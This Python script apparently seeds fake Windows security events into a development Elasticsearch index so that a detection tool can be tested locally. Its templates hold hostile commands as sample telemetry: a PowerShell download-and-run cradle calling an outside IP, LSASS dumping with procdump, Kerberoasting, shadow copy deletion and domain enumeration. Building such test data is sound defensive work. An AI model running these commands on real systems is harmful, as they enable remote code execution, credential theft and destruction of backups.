"""Seed fake security event data into dev Elasticsearch for local testing."""

import asyncio
import random
from datetime import datetime, timezone, timedelta

from elasticsearch import AsyncElasticsearch

from src.config import settings

HOSTS = ["DOROTHY", "TOTO", "WIZARD", "GLINDA"]
USERS = ["dorothy", "bill", "sqlservice", "Administrator"]

# Raw events — no TTP tags, just telemetry as the stripped-down Logstash would produce
SYSMON_TEMPLATES = [
    # Process creation (Event ID 1)
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 1,
            "event_data": {
                "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBP",
                "User": "OZ\\dorothy",
            },
        },
    },
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 1,
            "event_data": {
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": "rundll32.exe C:\\Users\\dorothy\\AppData\\Local\\Temp\\update.dll,DllRegisterServer",
                "User": "OZ\\dorothy",
            },
        },
    },
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 1,
            "event_data": {
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Windows\\System32\\net.exe",
                "CommandLine": "net group \"Domain Admins\" /domain",
                "User": "OZ\\bill",
            },
        },
    },
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 1,
            "event_data": {
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Tools\\AdFind.exe",
                "CommandLine": "adfind.exe -f objectcategory=computer -csv name operatingSystem",
                "User": "OZ\\bill",
            },
        },
    },
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 1,
            "event_data": {
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin delete shadows /all /quiet",
                "User": "NT AUTHORITY\\SYSTEM",
            },
        },
    },
    # Network connection (Event ID 3)
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 3,
            "event_data": {
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "DestinationIp": "185.141.27.100",
                "DestinationPort": "8080",
                "Protocol": "tcp",
                "User": "OZ\\dorothy",
            },
        },
    },
    # File creation (Event ID 11)
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 11,
            "event_data": {
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "TargetFilename": "C:\\Users\\dorothy\\Documents\\report.docx.ryk",
                "User": "NT AUTHORITY\\SYSTEM",
            },
        },
    },
    # Process access - LSASS (Event ID 10)
    {
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 10,
            "event_data": {
                "SourceImage": "C:\\Tools\\procdump.exe",
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1010",
                "User": "OZ\\bill",
            },
        },
    },
]

SECURITY_TEMPLATES = [
    # Kerberos TGS with RC4 (kerberoasting)
    {
        "winlog": {
            "channel": "Security",
            "event_id": 4769,
            "event_data": {
                "ServiceName": "MSSQLSvc/wizard.oz.local:1433",
                "TargetUserName": "sqlservice",
                "TicketEncryptionType": "0x17",
                "IpAddress": "10.0.1.4",
            },
        },
    },
    # RDP logon (Type 10)
    {
        "winlog": {
            "channel": "Security",
            "event_id": 4624,
            "event_data": {
                "LogonType": "10",
                "TargetUserName": "bill",
                "TargetDomainName": "OZ",
                "IpAddress": "10.0.1.4",
                "WorkstationName": "DOROTHY",
            },
        },
    },
    # Explicit credential use
    {
        "winlog": {
            "channel": "Security",
            "event_id": 4648,
            "event_data": {
                "SubjectUserName": "dorothy",
                "TargetUserName": "bill",
                "TargetServerName": "TOTO",
            },
        },
    },
]

POWERSHELL_TEMPLATES = [
    {
        "winlog": {
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "event_id": 4104,
            "event_data": {
                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://185.141.27.100/payload.ps1')",
            },
        },
    },
    {
        "winlog": {
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "event_id": 4104,
            "event_data": {
                "ScriptBlockText": "Invoke-Kerberoast -OutputFormat Hashcat | fl",
            },
        },
    },
]

ALL_TEMPLATES = SYSMON_TEMPLATES + SECURITY_TEMPLATES + POWERSHELL_TEMPLATES


async def seed():
    """Generate and index fake events spanning the last hour."""
    es = AsyncElasticsearch(settings.elasticsearch_url)

    # Wait for ES to be ready
    for _ in range(30):
        try:
            await es.info()
            break
        except Exception:
            print("Waiting for Elasticsearch...")
            await asyncio.sleep(2)

    now = datetime.now(timezone.utc)
    events = []

    # Generate 100 events over the last hour
    for i in range(100):
        template = random.choice(ALL_TEMPLATES)
        event = {
            "@timestamp": (now - timedelta(minutes=random.randint(0, 60))).isoformat(),
            "host": {"name": random.choice(HOSTS)},
            "event": {"module": "sysmon"},
        }
        # Deep merge template
        event.update(template)
        events.append(event)

    # Bulk index
    index_name = f"winlogbeat-{now.strftime('%Y.%m.%d')}"
    actions = []
    for event in events:
        actions.append({"index": {"_index": index_name}})
        actions.append(event)

    await es.bulk(operations=actions, refresh=True)
    print(f"Seeded {len(events)} events into {index_name}")

    # Also create the watcher indices
    for idx in [settings.alerts_index, settings.investigations_index, settings.state_index]:
        if not await es.indices.exists(index=idx):
            await es.indices.create(index=idx)
            print(f"Created index: {idx}")

    await es.close()


if __name__ == "__main__":
    asyncio.run(seed())
